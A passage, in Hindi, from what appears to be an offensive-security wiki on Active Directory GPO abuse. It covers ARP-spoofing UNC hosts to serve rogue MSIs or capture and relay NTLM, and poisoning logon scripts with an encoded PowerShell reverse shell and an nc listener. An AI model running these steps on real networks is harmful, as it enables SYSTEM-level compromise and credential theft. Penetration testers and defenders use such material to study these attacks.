अगर linked GPO किसी UNC path से MSI deploy करता है, तो client **कंप्यूटर स्टार्टअप** के दौरान उसे fetch करके **`NT AUTHORITY\SYSTEM`** के रूप में install करेगा। Referenced host को spoof करके और **उसी share/path/name** के तहत malicious MSI serve करके, आप **SYSVOL को modify किए बिना** `WriteGPLink` को SYSTEM code execution में बदल सकते हैं।

महत्वपूर्ण सीमाएँ:

- **समय महत्वपूर्ण है**: नया link policy refresh पर दिखाई देता है (आमतौर पर ~90 मिनट), लेकिन **Software Installation** आमतौर पर **reboot** पर trigger होता है।
- Windows Installer आमतौर पर deployment को package **`ProductCode`** से track करता है। अगर product पहले से install है, तो deployment skip हो सकता है।
- Installer rejection से बचने के लिए, rogue MSI को patch करें ताकि उसका **`ProductCode`** और **`PackageCode`**, GPO द्वारा अपेक्षित legitimate package से match करें।
- पुरानी `.aas` advertisement files `SYSVOL` में रह सकती हैं, इसलिए इस पर निर्भर होने से पहले पुष्टि करें कि deployment अब भी active दिखता है।

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` में GPP drive mappings के कारण, लॉगऑन या दोबारा कनेक्शन के दौरान users कॉन्फ़िगर किए गए UNC path पर authenticate करते हैं। यदि आप संदर्भित host को spoof करते हैं, तो आप **NetNTLMv2** capture कर सकते हैं। यदि SMB को जानबूझकर fail कराया जाए, तो Windows शायद **WebDAV** पर retry करे और **HTTP के ज़रिए NTLM** भेजे, जिसे **LDAP(S)**, **AD CS** या **SMB** पर relay करना कहीं अधिक आसान है।

#### Logon/startup script UNC hijack

यही तरीका `SYSVOL` में खोजी गई UNC-hosted scripts पर भी लागू होता है:

- **Logon scripts** आमतौर पर **user** context में execute होती हैं।
- **Startup scripts** आमतौर पर **computer / SYSTEM** context में execute होती हैं।

यदि script path किसी ऐसे hostname की ओर इंगित करता है जिसे spoof किया जा सकता है, तो UNC host को redirect करें और अपेक्षित location से replacement script content serve करें।

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` या `\\<dc>\NETLOGON\` के अंतर्गत writable paths, GPO के ज़रिए user logon के समय execute होने वाली logon scripts में छेड़छाड़ की अनुमति देते हैं। इससे लॉगऑन करने वाले users के security context में code execution मिलता है।

### Logon scripts खोजें
- कॉन्फ़िगर की गई logon script के लिए user attributes देखें:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- scripts के shortcuts या references खोजने के लिए domain shares को crawl करें:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- `.lnk` files को पार्स करके उन targets का पता लगाएँ जो SYSVOL/NETLOGON की ओर इंगित करते हैं (उपयोगी DFIR ट्रिक और उन attackers के लिए जिनके पास सीधे GPO access नहीं है):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound user object का `scriptPath` logon-script attribute मौजूद होने पर दिखाता है। GPO से configure किए गए logon scripts अलग policy reference होते हैं, इसलिए लागू GPO का भी निरीक्षण करें।

### Write access की पुष्टि करें (share listings पर भरोसा न करें)
Automated tooling SYSVOL/NETLOGON को read-only दिखा सकता है, जबकि उस खास script का NTFS ACL अलग हो सकता है। उस file और उसकी parent directory का read-only inspection करके शुरुआत करें; मेल खाने वाले Allow ACEs अब भी संभावित विकल्प हैं, क्योंकि प्रभावी SMB और NTFS access, Deny ACEs और मौजूदा token—सभी मायने रखते हैं:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

एक अधिकृत write test target-specific और reversible होना चाहिए, और original script का backup लेकर उसे restore किया जाना चाहिए। केवल access test करने के लिए किसी working logon script को overwrite न करें; सफल write अगली बार किसी user के logon पर चल सकता है।

### RCE के लिए VBScript logon script को poison करें
एक ऐसा command जोड़ें जो PowerShell reverse shell लॉन्च करे (revshells.com से generate करें), और business function को बाधित होने से बचाने के लिए original logic बनाए रखें:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

अपने होस्ट पर सुनें और अगले interactive logon की प्रतीक्षा करें:

```bash
rlwrap -cAr nc -lnvp 443
```

नोट्स:
- Execution logging user के token (SYSTEM नहीं) के अंतर्गत होता है। Scope उस GPO link (OU, site, domain) का है जो उस script को लागू करता है।
- उपयोग के बाद मूल content/timestamps को restore करके साफ़ करें।


## References

- [1] [Active Directory ACLs/ACEs का दुरुपयोग](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privileged Accounts और Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL Attack Path अपडेट](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory में ACLs के ज़रिए privileges बढ़ाना](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory Privileges और Privileged Accounts के लिए स्कैनिंग](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Linux से AD attribute/UAC operations](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, और DPAPI decryption से DC admin तक](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Code Execution और NTLM Relay के लिए GPO UNC Paths hijack करना](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: NTLM relaying के ज़रिए Active Directory GPOs का शोषण, और भी बहुत कुछ](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Active Directory में छिपे Organizational Units के ACL attack vectors का शोषण](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Network पर वैध Active Directory services का अनुकरण: GPO exploitation का मामला](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — OU movement और inherited ACL abuse](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
